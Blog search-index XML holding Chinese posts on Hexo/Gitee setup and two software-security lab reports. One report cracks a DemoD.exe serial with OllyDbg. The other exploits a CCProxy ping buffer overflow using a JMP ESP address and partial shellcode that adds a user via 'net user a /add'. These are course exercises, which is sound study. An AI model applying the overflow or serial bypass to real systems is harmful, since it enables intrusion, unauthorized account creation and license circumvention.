<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo部署到Gitee及相关问题</title>
    <url>/2021/04/19/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0Gitee%E5%8F%8A%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<hr>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前一直都是写好文章后直接部署到Github上，但最近发现Github会经常性连接不上，这对于我这个希望即写即传的人来说实在是太难受了。后来想到之前将图床部署在Gitee上，那么能不能将博客也部署在Gitee上呢？话不多说直接上手搜一手，果不其然是可以的，由于Gitee是国内的，不存在说连不上的问题，所以直接决定动手部署了！</p>
<hr>
<h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><ul>
<li>类似于在Github上部署的操作，在Gitee上先创建一个用户名同名的仓库，创建仓库时，语言选择$html$，可以先不进行初始化，选择公开。</li>
</ul>
<h2 id="添加SSH公钥"><a href="#添加SSH公钥" class="headerlink" title="添加SSH公钥"></a>添加SSH公钥</h2><ul>
<li><p>首先在博客根目录打开$Git\ Bash\ Here$,创建$SSH$公钥命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱地址&quot;</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱地址(同上一条命令)&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong><em>注意：上面第三条命令中的$ssh-keygen$是连在一起的，没有空格！没有空格！没有空格！重要的事情说三遍，猛男落泪:cry::cry::cry:</em></strong></p>
<p>上面命令进行时会提示公钥存储路径，一般情况下为  C:\Users\用户名.ssh ，查看目录可以发现 id_rsa和 id_rsa.pub​两个文件，其中id_rsa.pub正是我们需要的公钥。一路$Enter$下去即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419161954.png" alt="alt SSH公钥"></p>
<p>最后成功的结果如下图：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419162156.png" alt="alt 密钥成功生成"></p>
</li>
<li><p>接下来在Gitee中添加该公钥即可，具体方法为$“设置\rightarrow SSH公钥”$，添加公钥时公钥标题为仓库的名称，将上述生成的id_rsa.pub中的全部内容粘贴到其中即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419162626.png" alt="alt 添加密钥"></p>
</li>
<li><p>测试密钥连接：在控制台输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitee.com</span><br></pre></td></tr></table></figure>
<p>成功结果如下：</p>
</li>
</ul>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419165541.png" alt="alt 密钥连接成功"></p>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><ul>
<li><p>接下来修改根目录下的   _config.yml 文件即可，具体修改内容中的$repo$在仓库首页粘贴即可：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163409.png" alt="alt repo地址"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163504.png" alt="alt 配置文件修改"></p>
</li>
<li><p>之后按照以前部署的命令一样，直接在清空缓存文件，重新生成后$hexo \ d\ $就行了。</p>
</li>
</ul>
<h2 id="开启Gitee-Pages服务"><a href="#开启Gitee-Pages服务" class="headerlink" title="开启Gitee Pages服务"></a>开启Gitee Pages服务</h2><p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419163911.png" alt="alt Gitee Pages"></p>
<ul>
<li>选择强制使用Https后启动，启动成功后会得到一个地址：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210419164119.png" alt="alt 网站地址"></li>
<li>之后在_config.yml中将URL地址修改为该地址即可，需要注意的是每次更新($hexo\ d\ $)后，需要进入$Gitee\ Pages\ $服务进行更新即可。</li>
</ul>
<h2 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h2><ul>
<li>到这里基本上已经部署好了，不过我在部署的时候遇到了一个问题，就是在本地预览正确的文章，部署到上面后再访问却缺失了部分内容，查看仓库中的Html文件代码正确，但是查看页面源代码却消失了！被谁吃了给我吐出来！。后来上网搜索之后找到了一个办法：清除浏览器缓存。一开始不信的我试了一下竟然成功了，好吧，我只能拍手成妙。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><p><a href="https://blog.csdn.net/qq_38157825/article/details/112783631">Hexo 部署到 Gitee</a></p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_43889439/article/details/92760952">解决git@gitee.com: Permission denied (publickey).</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>PicGo + Gitee 搭建免费图床</title>
    <url>/2021/04/09/PicGo-Gitee-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建好自己的博客之后，非常激动啊！！！迫不及待的想写一篇文章来试试水，在往博客中插入图片时遇到了一个很大的问题：图片路径哪里来？由于搭建的是静态博客，如果将图片存放在本地硬盘空间内，网络端访问必然会产生无法获取图片的问题！玛莎卡？将图片存放在主题的 /source/img 文件夹下再在使用时使用相对路径？</p>
<p>细思极恐啊！当图片数量众多，项目文件必然臃肿，部署到云端也就更加慢了。在网上查找解决方法时发现可以搭建 <strong><em>图床</em></strong>  ，顾名思义就是云端用于存储图片的服务器吧，网上现在主流图床有SM.MS、腾讯云COS、Github图床、七牛、阿里云等，当然免费的图床主推Github和Gitee了，但是Github在国外时不时无法连接，而且速度肯定没有国内的码云快了，当然使用阿里云和腾讯云那些就不比了（白嫖真香！）。所以这里就采用了 <u><strong><em>Gitee + PicGo</em></strong></u> 搭建自己的图床。</p>
<p>注：使用码云搭建的图床具有对图片大小的限制，超过1MB大小的图片需要登录才能进行显示，因此这里提供一个用于压缩图片的网站：</p>
<p><strong><em><a href="https://tinypng.com/">TingPNG:<u>压缩图片</u></a></em></strong></p>
<h2 id="合成材料"><a href="#合成材料" class="headerlink" title="合成材料"></a>合成材料</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">码云（Gitee）账号，没有的可以创建</th>
<th><a href="https://gitee.com/">https://gitee.com/</a></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PicGo软件</td>
<td><a href="https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0-beta.5">https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0-beta.5</a></td>
</tr>
</tbody>
</table>
</div>
<p>注：<a href="https://github.com/Molunerfinn/PicGo">PicGo开源项目地址，可以查看使用文档</a></p>
<h2 id="Gitee准备"><a href="#Gitee准备" class="headerlink" title="Gitee准备"></a>Gitee准备</h2><p>类似于Github，先创建一个仓库，这里姑且命名为images，在该仓库中创建一个文件夹用于存放图片（也可以不创建），这里使用img作为文件夹名称。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409203754.png" alt="alt 示例"></p>
<p>创建仓库时需要添加开源许可证啥的，跟着走就行，记得“是否开源”选择“公开”。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409204152.png" alt="alt acejha"></p>
<p>这些结束后，需要创建一个token，下面会用到这个私人令牌，具体方法为：“个人主页→个人设置→私人令牌→生成新令牌”，添加描述后默认勾选提交即可，复制到剪贴板备用。在私人令牌管理界面可以对令牌进行删除、修改和重新生成等操作。</p>
<h2 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h2><p>安装好对应系统的PicGO后，在插件设置中找到Gitee-uploader插件安装，注意安装后重启软件。在正确安装的情况下，重启应用打开图床设置可以找到gitee选项。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205044.png" alt="alt jhhg"></p>
<p>gitee设置界面，相关参数如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">repo</th>
<th style="text-align:center">【必需】仓库名，见上文图片注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">master</td>
<td style="text-align:center">【可选】默认master</td>
</tr>
<tr>
<td style="text-align:center">token</td>
<td style="text-align:center">【必需】上文中生成的令牌</td>
</tr>
<tr>
<td style="text-align:center">path</td>
<td style="text-align:center">【可选】如果上文创建的话，可填img；反之可不填</td>
</tr>
<tr>
<td style="text-align:center">customPath和customUrl</td>
<td style="text-align:center">无需配置</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205324.png" alt="alt shiji"></p>
<p>点击确定和设为默认图床即可。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在上传区，可以选择拖拽上传，也可以点击剪贴板上传直接将截图上传，上传成功的话会有系统消息提醒。同时，在下方可以选择返回值的格式，返回值会在剪贴板中保留，在编写文档时直接粘贴即可。相册中可以查看已经上传的图片，香的一批啊有木有！</p>
<p>最后附上一个我个人经常选择图片的网站：<a href="https://beta.bz.zzzmh.cn/index">极简壁纸</a></p>
<p>参考：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
]]></content>
      <categories>
        <category>Gitee</category>
      </categories>
      <tags>
        <tag>Gitee</tag>
        <tag>教程</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32漏洞---破解DemoD.exe序列号</title>
    <url>/2021/06/26/Win32%E6%BC%8F%E6%B4%9E-%E7%A0%B4%E8%A7%A3DemoD-exe%E5%BA%8F%E5%88%97%E5%8F%B7/</url>
    <content><![CDATA[<hr>
<p><strong>$ps:$软件安全第一次实验内容，简单破解序列号(最后只破解了部分)</strong></p>
<hr>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>操作系统：Microsoft windows XP SP3</strong></p>
<p><strong>目标软件：DemoD.exe</strong></p>
<p><strong>分析工具：LordPE, OllyDbg，Visual C++ 6.0</strong></p>
<h1 id="实验过程记录"><a href="#实验过程记录" class="headerlink" title="实验过程记录"></a>实验过程记录</h1><p>首先用OllyDbg打开测试程序，这里对DemoD_简版.exe程序进行分析，对序列码的破解首先由于提示错误以窗口形式出现，所以这里对所有的MessageBox设置API断点，运行程序输入序列码测试发现程序在提示错误的地方发生中断。如下图中所示。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222710.png" alt="找到序列码匹配段的地址"></p>
<p>接下来在代码区右键选择中文搜索引擎，点击智能搜索，会在搜索结果中发现部分提示信息，双击提示信息即可进入该段代码，搜索结果如图所示。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222802.png" alt="利用中文搜索字符串"></p>
<p>双击上图中的“恭喜你！序列号第1部分正确！”进入序列号匹配段，进入后会发现在提示信息之前有一段“cmp eax,ecx”的代码，随后便出现“jnz DemoD_简.0040400C”的跳转指令，猜测cmp的指令为比较输入序列号和正确序列号的值，而跳转指令为输出错误信息的窗口。在比较指令之前设置断点，运行程序，设置第一段序列号为1234，请求验证序列号。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222845.png" alt="设置断点"></p>
<p>运行程序后，发现程序在上述断点处中断，接下来单步执行到比较指令处，由于设置的第一部分序列号为1234，这时观察右侧的寄存器值会发现EAX=00001234，ECX=0000AC70，可以判定EAX为自己所输入的值，而ECX即AC70即为第一段序列号的正确值。接下来，删除该处的断点，将断点设置在第二部分比较指令之前，再次运行，将已知地正确序列号输入，并将即将判断的序列号设置为1234，以此循环往复便可以得到第二部分和第三部分正确序列号的值。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222918.png" alt="第一部分比较"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222944.png" alt="第一部分验证"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223004.png" alt="第二部分比较"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223027.png" alt="第二部分正确"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223052.png" alt="第三部分比较"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223114.png" alt="第三部分正确"></p>
<hr>
<p>第四部分的判断逻辑较为复杂，且只在极少情况下会验证通过，这里只描述第四部分序列码的判断逻辑。观察这一部分的比较前的代码可知，对EAX和ECX的值进行比较，而EAX为ss:[ebp-0x158]处的值，假设我们输入的序列号为A-B-C-D，观察堆栈区地数值可以发现，ECX为A+B+C的值然后右移四位所得。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223205.png" alt="分析逻辑1"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223222.png" alt="分析逻辑2"></p>
<p>由上图可知，EBP-128、EBP-12C和EBP-130处存储的值为上述的ABC，而接下来的便是我们输入的完整的序列码。这里我们继续探究EAX的值即EBP-158处的值，往上查找代码会发现：首先查阅堆栈段发现[EBP-0x138]为A的值，而[EBP-0x144]为D的值，首先将二者相加赋予ECX，再将ECX与0xAFDA进行与操作后得到新的ECX，将ECX的值赋予[EBP-148]后赋给DX，最后将DX赋给[EBP-0x158]，最后得到EAX的值再与ECX进行比较进行判断。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223249.png" alt="分析逻辑4"></p>
<p><strong><em><u>关于第四部分序列号的比较逻辑：</u></em></strong></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223622.png" alt="第四部分序列号"></p>
<hr>
<h1 id="实验问题"><a href="#实验问题" class="headerlink" title="实验问题"></a>实验问题</h1><p>首先便是对<strong><u><em>断点的设置问题</em></u></strong>，利用常规思维便是在某处将输入的序列码与正确的序列码进行比较，而正确的序列码与输入待验证的序列码都存放在寄存器中，通过识别自己输入的序列码便可以获得正确的序列码从而进行下一部分的验证。实验过程中在设置断点时，利用中文搜索引擎获得当序列号输入正确时中文提示的语句所在位置，往上遍历便能得到“CMP”指令进行比较所在位置。这里对于前三部分的断点设置经历尝试后，设置于比较指令之前然后断点停下后再单步运行至该指令即可。</p>
<p>第二个问题便是<strong><em><u>正确序列码的变化问题</u></em></strong>，实验过程中发现，当实验时间超过一定时间后再次运行时，发现之前尝试获得的正确序列码已经发生了变化，重新进行实验验证便会发现已经生成了全新的正确的序列码等待验证。这在实验过程中造成了很大的困扰，多次尝试后才发现了这个问题。如上面实验过程中验证的前三部分正确的序列码为“AC70-BC32-E911”，而下图为另外一次尝试过程中的前三部分序列码验证正确时的场景，此时序列码为“D100-BC32-C386”。经过验证发现大概每1个小时左右序列码便会更新一次。</p>
<p>第三个问题便是<strong><em><u>最后一段序列码的验证问题</u></em></strong>，我仍旧天真的以为第四段序列码的验证方式与前三段的验证方式是相同的，当尝试多次失败后回过头去分析代码才发现程序将输入的前三段序列码进行了一定程度的数学运算后才会进行比较，也就是说第四段序列码并不是单纯的独立序列码，而是与前三段序列码都相关，（具体的运算分析可以参考上述实验一实验过程记录中的分析过程）。此外，在该部分序列码的运算过程中涉及了一个与“0xAFDA”的按位与操作，该操作之后产生的结果与正确的结果比较时会发生较大的误差，由于产生的与“0xAFDA”进行按位与操作的序列码与该时间内产生的序列码前三部分都相关，因此对前三部分序列码的要求较为严格，经过大致的分析，在同一时间内要求产生正确的可行的序列码的概率约为1/8，综合上面讲到的一个小时更换一次序列码来说，时间成本是极高的，因此这里在实验过程中只对第四部分的序列码的产生过程进行了简述。</p>
<hr>
<p>$OK,Let’s\ go!$</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 建站笔记</title>
    <url>/2021/04/08/Hexo-%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="搭建Hexo框架"><a href="#搭建Hexo框架" class="headerlink" title="搭建Hexo框架"></a>搭建Hexo框架</h1><p>本文基于windows操作系统搭建，hexo的相关操作可以用cmd命令台进行，也可以用下面安装的Git进行（推荐）；关于hexo主题的相关美化见后续文章，该系列可能会保持更新。另：本人也作为刚接触这里的新手，在文章中主要总结个人建站过程中的参考所得，望有不对的地方不吝赐教！</p>
<h2 id="设置淘宝镜像"><a href="#设置淘宝镜像" class="headerlink" title="设置淘宝镜像"></a>设置淘宝镜像</h2><p>由于在windows上使用npm下载时可能会速度过慢，所以这里改为淘宝镜像网站：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry <span class="string">&quot;https://registry.npm.taobao.org&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>Git官网地址：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p>
<p>安装过程无脑“下一步”即可。</p>
<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>Node.js官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p>这里推荐安装LTS(长期支持)版，选择对应的系统版本即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408-01.png" alt="image-20210408184444633"></p>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>可以自行创建目录，名称随意，例如D:\Hexo\myblog，并在myblog文件夹右键使用Git bash here(或者cmd进入该文件夹)，命令行输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装Hexo</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment">#初始化博客</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment">#Hexo三连,分别为清空生成文件、生成网站文件、启动本地预览</span></span><br><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<p>此时若没有错误情况，由于hexo默认位于4000端口开启，则可以在浏览器中打开<strong><em>localhost:4000</em></strong>，就可以看到已经初始化的Hexo博客，默认产生第一篇文章Hello world!此外也可以更换端口使用命令  <strong>hexo s -p 端口号</strong>  即可。</p>
<h2 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h2><p>由于我个人搭建的时候服务器仍未达到备案的期限，所以这里介绍将个人博客部署到github上面，后续若部署到个人域名时再进行更新。<br>首先，登录github创建一个新的仓库，并将仓库名命名为  <strong><em>用户名.github.io</em></strong>，注意这里仓库的名字是固定格式！！！<br>打开博客根目录（Hexo/myblog)下的根配置文件  <strong><em>_config.yml</em></strong>  文件找到deploy项，修改如下代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   <span class="built_in">type</span>: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">   repo: https://github.com/用户名/仓库名</span><br><span class="line">   <span class="comment"># 如Https://github.com/zhangsan/zhangsan.github.io</span></span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
<p>注： 注意在本博客几乎所有配置文件中，冒号之后都留有空格</p>
<p>在进行上传之前，需要先在Git bash中进行对<strong>user.name</strong>和<strong>user.email</strong>的设置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;Github用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;GitHub绑定邮箱&quot;</span></span><br><span class="line"><span class="comment">#最后再进行上传</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>他喵的现在Github时不时登录不上去，所以在进行hexo d部署的时候也经常会出现超时的错误，还是建议部署到自己的域名上去，后续部署时会对该文章进行更新的。</p>
<h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p>hexo提供了大量可选的主题，参考网站：<a href="https://hexo.io/themes/">Hexo主题</a></p>
<p>在根目录配置文件中可以设置主题，这里以butterfly主题为例，修改<strong><em>theme</em></strong>字条即可：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408204749.png" alt="alt 主题设置"></p>
<p>在上述网站或其他途径选择主题后需要将主题文件保存到<strong>/themes</strong>目录下，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装渲染插件</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
<h2 id="基础页"><a href="#基础页" class="headerlink" title="基础页"></a>基础页</h2><p>hexo创建页面的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page 页面名称</span><br></pre></td></tr></table></figure>
<p>创建成功后会在命令行中提示新建页面的位置，对文件<strong>index.md</strong>进行编辑可以修改页面布局。对不同主题，可以查看相应主题的文档使用，这里以butterfly主题对页面属性为例，如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:center">解释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">title</td>
<td style="text-align:center">【必需】页面标题</td>
</tr>
<tr>
<td style="text-align:center">date</td>
<td style="text-align:center">【必需】创建日期</td>
</tr>
<tr>
<td style="text-align:center">updated</td>
<td style="text-align:center">【可选】更新日期</td>
</tr>
<tr>
<td style="text-align:center">type</td>
<td style="text-align:center">【必需】页面类型</td>
</tr>
<tr>
<td style="text-align:center">description</td>
<td style="text-align:center">【可选】页面描述</td>
</tr>
<tr>
<td style="text-align:center">top_img</td>
<td style="text-align:center">【可选】顶部图片</td>
</tr>
<tr>
<td style="text-align:center">aside</td>
<td style="text-align:center">【可选】显示侧边栏</td>
</tr>
<tr>
<td style="text-align:center">aplayer</td>
<td style="text-align:center">【可选】加载Aplayer</td>
</tr>
<tr>
<td style="text-align:center">keyworads</td>
<td style="text-align:center">【可选】页面关键字</td>
</tr>
</tbody>
</table>
</div>
<h2 id="文章页"><a href="#文章页" class="headerlink" title="文章页"></a>文章页</h2><p>创建命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;文章命令&quot;</span></span><br></pre></td></tr></table></figure>
<p>同上述基础页介绍，具体属性等可参照下面的参考资料。</p>
<h2 id="页面设置"><a href="#页面设置" class="headerlink" title="页面设置"></a>页面设置</h2><p>打开根目录下的<strong><em>_config.yml</em></strong>文件可以看到下面的属性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#site</span></span><br><span class="line">title: (1)</span><br><span class="line">description: (2)</span><br><span class="line">author: (3)</span><br><span class="line">language: 默认en,可修改</span><br><span class="line">email: <span class="string">&#x27;邮箱地址&#x27;</span></span><br></pre></td></tr></table></figure>
<p>相应位置如下图：</p>
<p><div align="center">
        <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/%E4%B8%8B%E8%BD%BD.png">  
        <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408212212.png">
</div><br>后续会写对butterfly的美化过程。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>【1】<a href="https://hexo.io/docs/">Hexo文档</a><br>【2】<a href="https://butterfly.js.org/posts/21cfbf15/">Jerry大佬教程</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32漏洞实例分析---CCproxy</title>
    <url>/2021/06/27/Win32%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-CCproxy/</url>
    <content><![CDATA[<hr>
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>$ps:$正好这两天在备考软件安全要复习实验内容，索性就打算复习实验的同时将部分内容的报告展示出来，做一次记录。实验中的内容可能在实际操作时会有差错，BUG可能会有的。</p>
</div>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>操作系统：Microsoft windows XP SP3 或者 win7</strong></p>
<p><strong>溢出软件：CCPROXY</strong></p>
<p><strong>溢出工具：OllyDbg，Visual C++ 6.0</strong></p>
<hr>
<h1 id="实验过程记录"><a href="#实验过程记录" class="headerlink" title="实验过程记录"></a>实验过程记录</h1><h2 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h2><p>首先找出溢出点，在XP主机上打开CCProxy后再cmd控制台上利用“telnet 127.0.0.1”命令连接CCProxy代理服务，实验发现当ping一个较短的字符串时，程序会正常执行并提示“Host not found”，而当程序ping一个较长的字符串时会发生溢出并报错（如下图），利用简单的二分法多次尝试可以发现当ping后最多接1009个字符时恰好不产生溢出，而当其后有1010个字符时会发生溢出，且会溢出覆盖到EIP。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215240.png" alt="溢出点查询" style="zoom:67%;" /></p>
<p>得知上述溢出点后，接下来便可以进行漏洞利用，这里采用的工具为x32dbg，根据之前的“Host not found”提示，我们可以在dbg中进行字符串的搜索并定位到该字符串所在语句（如下图所示），在该语句处设置断点。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215326.png" alt="查找“Host not Found”语句"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215440.png" alt="设置断点"></p>
<h2 id="设置-JMP-ESP-跳转"><a href="#设置-JMP-ESP-跳转" class="headerlink" title="设置$JMP\ ESP$跳转"></a>设置$JMP\ ESP$跳转</h2><p>上述断点设置成功后，在该软件中运行CCProxy并在控制台中ping一个较长的字符串（使其发生溢出），在该软件中会在断点前停下来，这时单步步过执行到“ret 0xc”指令处观察此时的ESP=0x012B66F0，由此可知当“ret 0xc”指令执行后的下一指令对应地址为0x012B66F0，而执行后EIP=[ESP]且ESP=ESP+0xC+0x4，接下来考虑将ESP指向地址覆盖为JMP ESP指令所在地址，然后将修改过的ESP填充我们想要执行的shellcode即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215648.png" alt="Ret指令前的ESP指向值"></p>
<p>此时的我们想要将ESP指向地址执行JMP ESP指令，在本区域内搜索指令“JMP ESP”后发现没有该指令，于是我们查询所有模块中的指令即可。这里搜索到的“JMP ESP”指令众多，考虑到后面我们将JMP ESP指令填入shellcode时将其存放在字符数组内而可编写字符的ASCII范围为0x20-0x7F，我们可以选取0x00514C6E。（也可以使用\x转义）。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215743.png" alt="查询JMP ESP指令"></p>
<p>接下来只需要先把ESP指向地址覆盖为我们想要的“JMP ESP”指令地址即可。观察可以发现在当前ESP指令的接下来一段数据已经被我们输入的字符串（这里输入的全部是‘a’即ASCII码61覆盖）。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215834.png" alt="修改ESP指向地址" style="zoom:50%;" /></p>
<h2 id="添加-Shellcode"><a href="#添加-Shellcode" class="headerlink" title="添加$Shellcode$"></a>添加$Shellcode$</h2><p>接下来我们来实现基本的添加用户的shellcode，在cmd控制台中的命令为“net user a /add”（这里添加一个用户名为a的用户）。在程序语言中便需要调用system函数，在工具中查看当前程序的符号界面会发现该程序加载了“msvcrt.dll”的系统动态链接库文件，而其中便包含有system函数，因此我们就可以利用这一点实现shellcode的注入及利用。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220117.png" alt="程序加载了msvcrt.dll库文件"></p>
<p>接下来我们先编写shellcode来获取shellcode的机器码然后实现注入，这里利用的工具为VS2019，实现win32控制台应用的方法为“新建桌面引导→控制台程序”，编写shellcode的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;msvcrt.dll&quot;</span>);</span><br><span class="line">    __asm&#123;</span><br><span class="line">            push ebp ;保存ebp，esp－<span class="number">4</span></span><br><span class="line">            mov ebp,esp ;给ebp赋新值，将作为局部变量的基指针</span><br><span class="line">            <span class="keyword">xor</span> edi,edi ;</span><br><span class="line">            push edi ;压入<span class="number">0</span>，esp－<span class="number">4</span>,;作用是构造字符串的结尾\<span class="number">0</span>字符 </span><br><span class="line">            sub esp,<span class="number">0</span>ch</span><br><span class="line">            mov byte ptr [ebp<span class="number">-10</span>h],<span class="number">6</span>eh;n</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0f</span>h],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>eh],<span class="number">74</span>h;t</span><br><span class="line">            mov byte ptr [ebp<span 